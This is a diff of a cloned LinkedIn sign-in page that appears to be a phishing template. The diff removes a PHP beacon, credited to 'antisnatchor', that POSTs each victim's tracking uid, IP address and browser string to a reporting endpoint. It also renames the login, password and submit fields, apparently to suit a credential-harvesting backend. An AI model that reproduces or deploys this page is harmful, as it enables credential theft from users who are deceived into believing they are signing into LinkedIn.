@@ -1,25 +1,3 @@
-<!-- created by antisnatchor, 10th September 2014-->
-<?php
-   $uid = $_GET['uid'];
-   $ip = $_SERVER["REMOTE_ADDR"];
-   $browser = $_SERVER['HTTP_USER_AGENT'];
-   $host = $_SERVER['HTTP_HOST'];
-
-  $url = "http://" . explode(".",$host,2)[1] . '/reports/results/';
-  $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip);
-
-  // use key 'http' even if you send the request to https://...
-  $options = array(
-          'http' => array(
-          'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-          'method'  => 'POST',
-          'content' => http_build_query($data),
-          ),
-  );
-  $context  = stream_context_create($options);
-  $result = file_get_contents($url, false, $context);
-?>
-
 <!DOCTYPE html>
 <!--[if lt IE 7]> <html lang="en" class="ie ie6 lte9 lte8 lte7 os-win"> <![endif]-->
 <!--[if IE 7]> <html lang="en" class="ie ie7 lte9 lte8 lte7 os-win"> <![endif]-->
@@ -139,7 +117,7 @@ Sign In
 <label for="session_key-login">Email address</label>
 <script id="control-http-12157-58149-1" type="linkedin/control" class="li-control">LI.Controls.addControl('control-http-12157-58149-1','GhostLabel',{});</script>
 <span class="error" id="session_key-login-error"></span>
-<input type="text" name="session_key" value="" id="session_key-login" data-ime-mode-disabled>
+<input type="text" name="UsernameForm" value="" id="session_key-login" data-ime-mode-disabled>
 <div class="domain-suggestion hide" id="domainSuggestion">
 <span>Did you mean: <a id="suggestion" href="javascript:void(0);"></a>?</span>
 </div>
@@ -151,13 +129,13 @@ Sign In
 <div class="fieldgroup">
 <span class="error" id="session_password-login-error"></span>
 <div class="password_wrapper">
-<input type="password" name="session_password" value="" id="session_password-login" class="password">
+<input type="password" name="PasswordForm" value="" id="session_password-login" class="password">
 <a data-li-tooltip-id="login-tooltip" href="https://www.linkedin.com/uas/request-password-reset?session_redirect=&amp;trk=signin_fpwd" tracking="signin_fpwd" class="nav-link forgot-password-link password-reminder-link" title="Forgot password?">?</a>
 </div>
 </div>
 </li>
 <li class="button">
-<input type="submit" name="signin" value="Sign In" class="btn-primary" id="btn-primary">
+<input type="submit" name="submit" value="Sign In" class="btn-primary" id="btn-primary">
 <span>Not a member? <a href="https://www.linkedin.com/reg/join?trk=uas-consumer-login-internal-join-lnk">Join now</a></span>
 </li>
 </ul>
